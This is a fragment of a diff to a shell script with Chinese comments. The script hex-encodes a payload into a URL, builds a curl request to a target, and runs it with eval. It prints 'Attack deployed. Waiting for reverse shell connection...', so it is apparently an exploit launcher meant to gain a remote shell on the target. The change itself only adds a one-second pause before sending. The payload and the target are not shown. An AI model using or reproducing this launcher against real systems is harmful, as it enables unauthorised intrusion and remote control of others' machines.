@@ -33,9 +33,14 @@ URL_FULL_PAYLOAD=$(echo ${FULL_PAYLOAD} | xxd -plain | tr -d '\n' | sed 's/\(..\
 # 构建 curl 命令
 CURL_COMMAND="curl \"${TARGET_URL}?payload=${URL_FULL_PAYLOAD}\""
 
-# 输出并发送 payload
+# 输出 payload
 echo "Sending payload with the following curl command:"
 echo $CURL_COMMAND
+
+# 等待1s
+sleep 1
+
+# 发送payload
 eval $CURL_COMMAND
 
 echo "Attack deployed. Waiting for reverse shell connection..."
